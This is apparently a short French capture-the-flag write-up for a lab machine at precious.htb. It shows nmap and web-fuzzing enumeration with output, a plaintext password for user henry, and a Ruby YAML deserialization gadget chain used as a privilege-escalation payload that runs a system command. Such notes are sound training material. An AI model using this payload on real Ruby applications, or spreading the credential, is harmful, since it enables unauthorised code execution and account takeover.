# Target : 10.129.228.98

# Enumeration des ports et Services sur la machine

```js
nmap -sV -sC 10.129.228.98
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 17:17 +0000
Nmap scan report for 10.129.228.98
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds
```

Domaine trouvee : precious.htb

## Enumeration du port 80  (nginx 1.18.0)

![](/assets/Pasted-image-20260813172031.png)


### Enumeration des sous domaines

```js
ffuf -u "http://precious.htb" -H "Host: FUZZ.precious.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
```

Aucun sous domaine trouve
### Enumeration des repertoires

```js
feroxbuster -u http://precious.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x .txt,.html,.bak,.env,.php,.xmlc, .git -k --redirects
```

Aucun sous domaine trouve

# Henry Creds

```js
henry:Q3c1AqGHtoI0aXAYFH
```




# Privesc payload

```js
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

